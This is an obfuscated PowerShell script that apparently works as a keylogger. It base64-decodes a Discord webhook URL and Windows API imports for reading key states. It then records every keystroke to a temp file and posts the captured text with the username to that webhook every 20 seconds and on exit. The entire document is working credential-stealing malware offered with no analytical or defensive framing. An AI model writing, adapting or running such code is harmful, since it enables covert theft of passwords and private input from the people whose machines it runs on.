$z1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4MDk3NjQyNTIwODc3ODkzNS9CWW5nUmk2Vy1iSlM0MG1RaVJMbzZlbmoxQTRZYWpSOHFSMGpFeFpUQTR6dVByNmk3YzRHNFNZVUNTcFB4emhsbEJrZQ=='))
$z2 = [System.Environment]::GetEnvironmentVariable('TEMP') + '\' + [System.Environment]::UserName + '.log'
$z3 = [System.Environment]::GetEnvironmentVariable('TEMP') + '\x7a9q2w3e'

$global:pid | Out-File $z3

function x9($p1=$z2) {
    if (-not (Test-Path $p1)) { New-Item -Path $p1 -ItemType File -Force | Out-Null }

    $z4 = [System.Convert]::FromBase64String('W0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvLCBFeGFjdFNwZWxsaW5nPXRydWUpXQpwdWJsaWMgc3RhdGljIGV4dGVybiBzaG9ydCBHZXRBc3luY0tleVN0YXRlKGludCB2aXJ0dWFsS2V5Q29kZSk7CltEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0PUNoYXJTZXQuQXV0byldCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBHZXRLZXlib2FyZFN0YXRlKGJ5dGVbXSBrZXlzdGF0ZSk7CltEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0PUNoYXJTZXQuQXV0byldCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBNYXBWaXJ0dWFsS2V5KHVpbnQgdUNvZGUsIGludCB1TWFwVHlwZSk7CltEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0PUNoYXJTZXQuQXV0byldCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBUb1VuaWNvZGUodWludCB3VmlydEtleSwgdWludCB3U2NhbkNvZGUsIGJ5dGVbXSBscGtleXN0YXRlLCBTeXN0ZW0uVGV4dC5TdHJpbmdCdWlsZGVyIHB3c3pCdWZmLCBpbnQgY2NoQnVmZiwgdWludCB3RmxhZ3MpOw==')
    $z5 = [System.Text.Encoding]::ASCII.GetString($z4)
    $z6 = Add-Type -MemberDefinition $z5 -Name 'x7' -Namespace y8 -PassThru

    $z8 = Get-Date

    try {
        while ($true) {
            if (((Get-Date) - $z8).TotalSeconds -ge 20) {
                try {
                    $z9 = Get-Content -Path $p1 -Raw -Encoding Unicode
                    if ($z9) {
                        $z9 = $z9.Substring(0, [Math]::Min($z9.Length, 2000))
                        $z9 = $z9 -replace '[^\x20-\x7E]', ''
                        $z10 = @{ 'u' = [System.Environment]::UserName; 'c' = $z9 }
                        $z11 = $z10 | ConvertTo-Json
                        Add-Content -Path ([System.Environment]::GetEnvironmentVariable('TEMP') + '\z12.log') -Value "Payload: $z11"
                        Invoke-RestMethod -Uri $z1 -Method Post -Body $z11 -ContentType 'application/json' | Out-Null
                        Clear-Content -Path $p1 -Force
                    }
                }
                catch {
                    $z13 = $_.Exception.Message
                    if ($_.Exception.Response) {
                        $z14 = $_.Exception.Response.GetResponseStream()
                        $z15 = New-Object System.IO.StreamReader($z14)
                        $z16 = $z15.ReadToEnd()
                        $z13 += " - Resp: $z16"
                    }
                    Add-Content -Path ([System.Environment]::GetEnvironmentVariable('TEMP') + '\z17.log') -Value $z13
                }
                $z8 = Get-Date
            }

            for ($i = 9; $i -le 254; $i++) {
                $z18 = $z6::GetAsyncKeyState($i)
                if ($z18 -eq -32767) {
                    $null = [console]::CapsLock
                    $z19 = $z6::MapVirtualKey($i, 3)
                    $z20 = New-Object Byte[] 256
                    $z21 = $z6::GetKeyboardState($z20)
                    $z22 = New-Object -TypeName System.Text.StringBuilder

                    if ($z6::ToUnicode($i, $z19, $z20, $z22, $z22.Capacity, 0)) {
                        [System.IO.File]::AppendAllText($p1, $z22, [System.Text.Encoding]::Unicode)
                    }
                }
            }
        }
    }
    finally {
        try {
            $z9 = Get-Content -Path $p1 -Raw -Encoding Unicode
            if ($z9) {
                $z9 = $z9.Substring(0, [Math]::Min($z9.Length, 2000))
                $z9 = $z9 -replace '[^\x20-\x7E]', ''
                $z10 = @{ 'u' = [System.Environment]::UserName; 'c' = $z9 }
                $z11 = $z10 | ConvertTo-Json
                Add-Content -Path ([System.Environment]::GetEnvironmentVariable('TEMP') + '\z12.log') -Value "Final: $z11"
                Invoke-RestMethod -Uri $z1 -Method Post -Body $z11 -ContentType 'application/json' | Out-Null
            }
        }
        catch {
            $z13 = $_.Exception.Message
            if ($_.Exception.Response) {
                $z14 = $_.Exception.Response.GetResponseStream()
                $z15 = New-Object System.IO.StreamReader($z14)
                $z16 = $z15.ReadToEnd()
                $z13 += " - Resp: $z16"
            }
            Add-Content -Path ([System.Environment]::GetEnvironmentVariable('TEMP') + '\z17.log') -Value $z13
        }
    }
}

Invoke-Expression "x9"
